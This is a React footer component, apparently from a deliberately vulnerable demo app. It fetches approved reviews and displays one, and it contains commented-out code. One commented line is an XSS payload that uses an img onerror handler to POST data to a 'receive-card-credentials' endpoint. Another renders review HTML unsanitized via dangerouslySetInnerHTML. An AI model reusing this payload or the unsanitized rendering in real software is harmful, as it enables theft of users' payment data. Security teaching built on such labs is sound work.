import '../../style/footer.css'
import { Link } from 'react-router-dom'
import ProfileImage from '../global/profileImage'
import styled from 'styled-components'
import formatDate from '../../utils/formatDate'
import React, {useState, useEffect} from 'react';
import axios from 'axios';
import StarsRating from '../global/starsRating'

const UserDetails=styled.div`
width: 50%;
@media (max-width: 1100px) {
  width: 100%;
}
`;

const Review=styled.div`
width: 60%;
padding: 5px 0 0 0;
margin: 0 0 0 7px;

@media (max-width: 1100px) {
  width: 100%;
}
`;

const StyledH3 = styled.h3`
  color: #88ccca; // Bluish-green silver radiant
  text-shadow: 2px 2px 5px rgba(150, 150, 150, 0.5);
`;

export default function VulnerableFooter() {

    const [reviews, setReviews]=useState([]);

    const getReviews=async () =>{
        try {
          const res=await axios.get(`http://localhost:3000/countries/pak/cities/khi/grounds/ma-1/reviews`, {headers: {"Authorization": `Bearer ${sessionStorage.getItem("accessToken")}`}});
    
          const sortedReviews=res.data.reviews.filter((review => review.status==='Approved'));
          setReviews(sortedReviews);
          console.log(reviews[0])

        } catch (error) {
          console.log(error);
        }
      }

      useEffect(() => {
        getReviews()
      }, [])

  return (
    <footer>
        <div className='footerLogoContent'>
            <StyledH3>See what our most trusted users have to say!</StyledH3>
            <br />
        {reviews.length>0 ? 
        <>
        <UserDetails>
        <div style={{display: 'flex', flexDirection: 'row'}}>
          <ProfileImage width={50} height={50} url={reviews[0].user.profileImage} />
          <div>
            <p style={{fontSize: '18px', fontWeight: '500', color: 'whitesmoke', margin: 'auto 0 auto 15px'}}>{reviews[0].user.firstName + " " + reviews[0].user.lastName}</p>
            <p style={{fontSize: '14px', fontWeight: '500', color: 'grey', margin: '0 0 0 15px'}}>{formatDate(reviews[0].createdAt)}</p>
          </div>
        </div>
        </UserDetails>
        <Review>
                    <div>
                      <StarsRating totalStars={10} starSize={15} selected={11} style={{margin: '0 0 10px 0', display: 'inline-block'}} disableHover={true} disableSelection={true} />
                    </div>
                    {/* <div dangerouslySetInnerHTML={{ __html: `<img src="invalid-image" onerror="fetch('http://localhost:4000/receive-card-credentials', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: 'New data' })}).then(response => response.text()).then(data => console.log('Data:', data)).catch(error => console.error('Error:', error))">` }}></div> */}
                    {/* <div dangerouslySetInnerHTML={{ __html: reviews[0].review }}></div> */}
                    <p style={{fontSize: '16px', fontWeight: '500', color: 'whitesmoke', margin: '0 0 5px 3px'}}>{reviews[0].review}</p>
        </Review>
        </>
        :
        <div />
        }   
        </div>
        <div className='footerContent'>
            <ul className='footerList firstList'>
              <li className="footerTitle">MY ACCOUNT</li>
              <li className='footerBox'><Link to="/users/:id" className='footerLink'>Profile</Link></li>
              <li className='footerBox'><Link to="/login" className='footerLink'>Login</Link></li>
              <li className='footerBox'><Link to="/payment" className='footerLink'>Checkout</Link></li>
              <li className='footerBox'><Link to="/teams" className='footerLink'>Register Team</Link></li>
              <li className='footerBox'><Link to="/grounds" className='footerLink'>Register Ground</Link></li>
            </ul>
            <ul className='footerList secondList'>
              <li className="footerTitle">SERVICE</li>
              <li className='footerBox'><Link to="/about" className='footerLink'>About us</Link></li>
              <li className='footerBox'><Link to="/contact" className='footerLink'>Contact us</Link></li>
              <li className='footerBox'><Link to="/faqs" className='footerLink'>FAQs</Link></li>
              <li className='footerBox'><Link to="/privacy" className='footerLink'>Privacy Policy</Link></li>
              <li className='footerBox'><Link to="/refund" className='footerLink'>Refund Policy</Link></li>
            </ul>
        </div>
    </footer>
  )
}
